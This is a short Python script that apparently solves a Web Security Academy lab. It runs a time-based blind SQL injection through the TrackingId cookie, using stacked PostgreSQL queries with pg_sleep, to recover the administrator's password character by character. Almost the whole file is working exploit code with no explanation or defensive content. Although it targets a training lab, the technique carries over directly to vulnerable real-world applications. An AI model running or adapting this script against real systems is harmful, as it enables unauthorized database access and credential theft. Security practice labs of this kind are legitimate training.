import requests, time, sys, signal

url = "https://acb31ff81fc0668580d5266a0081002f.web-security-academy.net/filter?category=Accessories"
characters = "0123456789abcdefghijklmnopqrstuvwxyz"
result = ""

def check(payload):
    cookies_payload = {"TrackingId": payload}
    time_start = time.time()
    response = requests.get(url, cookies=cookies_payload)
    time_end = time.time()
    
    if time_end - time_start > 10:
        return 1

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

for posicion in range(1,21):
    for caracter in characters:
        payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,{},1)='{}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--".format(posicion,caracter)
        if check(payload):
            result += caracter
            print(result)
            break

print("Administrator password: {}".format(result))